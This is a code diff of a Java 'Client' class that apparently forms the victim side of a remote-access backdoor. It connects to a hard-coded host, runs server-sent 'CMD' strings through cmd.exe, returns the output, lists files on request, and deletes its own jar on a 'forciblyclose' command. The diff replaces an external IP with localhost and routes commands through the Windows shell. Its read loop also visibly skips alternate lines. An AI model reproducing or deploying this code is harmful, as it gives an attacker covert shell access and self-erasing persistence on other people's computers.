@@ -5,7 +5,7 @@ import java.net.Socket;
 import java.util.ArrayList;
 
 public class Client {
-    private static String HOST = "141.219.247.21";
+    private static String HOST = "127.0.0.1";
     private static int PORT = 22122;
     private BufferedOutputStream out;
     private Socket socket;
@@ -56,18 +56,15 @@ public class Client {
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             out = new BufferedOutputStream(socket.getOutputStream());
             System.out.println("Client started: " + getHOST() + ":" + getPORT());
-            String comm;
-            while ((comm = in.readLine()) != null) {
-                comm = in.readLine();
+            while (in.readLine() != null) {
+                String comm = in.readLine();
                 if (comm.contains("CMD ")) {
                     System.out.println(comm);
                     exec(comm.replace("CMD ", ""));
-                }
-                if (comm.contains("FILELIST")) {
+                } else if (comm.contains("FILELIST")) {
                     communicate("FILELIST");
                     sendFileList();
-                }
-                if (comm.equals("forciblyclose")) {
+                } else if (comm.equals("forciblyclose")) {
                     communicate("forciblyclose");
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
                     f.delete();
@@ -92,17 +89,15 @@ public class Client {
     /* Execute a command using Java's Runtime. */
     private void exec(String command) throws IOException, InterruptedException {
         if (!command.equals("")) {
-
             try {
-                ProcessBuilder pb = new ProcessBuilder(command);
+                ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
                 pb.redirectErrorStream(true);
                 Process proc = pb.start();
-                BufferedReader in =
-                        new BufferedReader(new InputStreamReader(proc.getInputStream()));
                 String line;
                 communicate("CMD");
                 try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
-                     DataOutputStream dos = new DataOutputStream(bos)) {
+                     DataOutputStream dos = new DataOutputStream(bos);
+                     BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()))) {
                     ArrayList<String> output = new ArrayList<>();
                     while ((line = in.readLine()) != null) {
                         output.add(line);
@@ -113,17 +108,13 @@ public class Client {
                         dos.writeUTF(s);
                     }
                     dos.close();
+                    in.close();
                 } catch (IOException e) {
-                    e.printStackTrace();
+                    exec("");
                 }
-
-                communicate("END");
-                in.close();
             } catch (IOException e) {
-                e.printStackTrace();
                 exec("");
             }
-
         }
     }
 
